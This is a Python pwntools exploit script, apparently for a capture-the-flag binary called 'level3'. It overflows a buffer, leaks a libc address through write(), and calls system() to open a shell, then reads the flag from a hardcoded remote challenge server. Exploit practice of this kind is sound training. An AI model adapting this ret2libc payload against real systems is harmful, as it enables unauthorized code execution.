#!/usr/bin/env python3
#! -*- coding : utf-8 -*-

import os, sys
from pwn import *
from ctypes import *

context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

target='./level3'
use_gdb = False

libc_path = '/lib/i386-linux-gnu/libc.so.6'
libc_path = './libc_32.so.6'
elf  = ELF("./level3")

libc = ELF(libc_path)
#def exp(ip = None, port = None, use_gdb = False):
def exp(ip = None, port = None):
    global use_gdb
    remote_run = False
    flag = None

    if ip and port:
        p = remote(ip, port)
        use_gdb = False
        remote_run = True
    else:
        p=process(target)
    if use_gdb:
        gdb.attach(p)
        pause()

    write_plt = elf.plt['write']
    write_got = elf.got['write']
    main_addr = elf.symbols['main']
    
    payload = b'a'*(0x88) + p32(0xdeadbeef) + p32(write_plt) + p32(main_addr) + p32(1) + p32(write_got) + p32(4)
    
    p.sendafter("Input:\n", payload)
    libc_write_addr = u32(p.recvn(4))
    libc_base_addr = libc_write_addr - libc.symbols['write']
    libc_system_addr = libc_base_addr + libc.symbols['system']
    if remote_run:
        bash_addr = libc_base_addr + 0x15902b
    else:
        bash_addr = libc_base_addr + 0x192352
    log.info('write addr: {0:x}'.format(libc_write_addr))
    log.info('libc base addr: {0:x}'.format(libc_base_addr))

    payload = b'b'*(0x88) + p32(0xdeadbeef) + p32(libc_system_addr) + p32(0xdeadbeef) + p32(bash_addr) + p32(0xdeadbeef)
    p.sendafter("Input:\n", payload)

    #p.recv()
    if remote_run:
        p.sendline('cat flag')
        flag = p.recvuntil(b'\n')
    else:
        p.interactive()

    log.info(flag)

if __name__ == "__main__":
    ip, port = None, None
    remote_str = None
    remote_str = '220.249.52.133:49051'

    if len(sys.argv) > 1:
        remote_str = sys.argv[1]
    if remote_str:
        ip, port = remote_str.split(":")

    exp(ip, port)